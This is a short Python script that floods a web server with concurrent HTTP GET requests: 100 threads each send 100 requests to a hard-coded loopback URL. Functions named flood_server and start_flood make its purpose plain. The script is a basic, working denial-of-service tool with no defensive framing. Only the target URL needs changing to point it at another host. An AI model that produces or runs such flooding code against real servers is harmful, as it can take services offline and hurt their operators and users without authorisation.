import requests
import threading

# Target server URL
url = "http://127.0.1.1:80"

# Number of concurrent requests
concurrent_requests = 100

# Number of requests to send per thread
requests_per_thread = 100

def flood_server():
    for _ in range(requests_per_thread):
        try:
            response = requests.get(url, timeout=1)
            print(f"Sent request {_+1} to {url}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending request: {e}")

def start_flood():
    threads = []
    for _ in range(concurrent_requests):
        t = threading.Thread(target=flood_server)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    start_flood()